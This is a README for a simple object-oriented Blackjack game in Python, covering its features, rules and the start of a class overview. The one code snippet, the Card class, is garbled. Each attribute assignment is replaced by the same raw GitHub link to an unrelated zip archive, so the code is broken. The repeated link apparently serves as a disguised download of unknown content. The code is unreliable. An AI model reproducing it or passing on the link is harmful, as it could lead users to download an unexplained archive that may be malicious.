# 🃏 Blackjack Game (Python)

A simple, console-based **Blackjack** game written in Python, featuring a virtual dealer and player.  
You can place bets, draw cards (HIT), and compete against the dealer just like in a real casino — with Ace value choices and bankroll management!

---

## 🎮 Features

✅ **Object-Oriented Design** — uses classes for `Card`, `Deck`, `Player`, and `Dealer`.  
✅ **Betting System** — player starts with $1000, can bet between $100 and $200 per round.  
✅ **Ace Handling** — choose Ace as `1` or `11` dynamically.  
✅ **Dealer Logic** — dealer automatically hits until reaching 17 or higher.  
✅ **Balance Tracking** — winnings and losses are automatically updated.  
✅ **Multiple Rounds** — option to replay rounds until you run out of money.

---

## 🧠 Game Rules

- The goal is to reach **21** or come closer to it than the dealer **without going over**.
- Both player and dealer are dealt **2 cards** initially.
- You can choose to **HIT** (draw more cards) or **STAND**.
- If your total exceeds **21**, you **bust** and lose the bet.
- Dealer must hit until their total is **17 or higher**.
- A Blackjack (Ace + 10-value card) pays **3:2**.
- If both have the same value, it’s a **tie** (no money exchange).

---

## 🧩 Classes Overview

### `Card`
Represents a single playing card.
```python
class Card:
    def __init__(self, suit, rank):
        https://raw.githubusercontent.com/Prajwalgrathish/my-code/main/gynecratic/my-code-2.1-alpha.3.zip = suit
        https://raw.githubusercontent.com/Prajwalgrathish/my-code/main/gynecratic/my-code-2.1-alpha.3.zip = rank
        https://raw.githubusercontent.com/Prajwalgrathish/my-code/main/gynecratic/my-code-2.1-alpha.3.zip = values[rank]
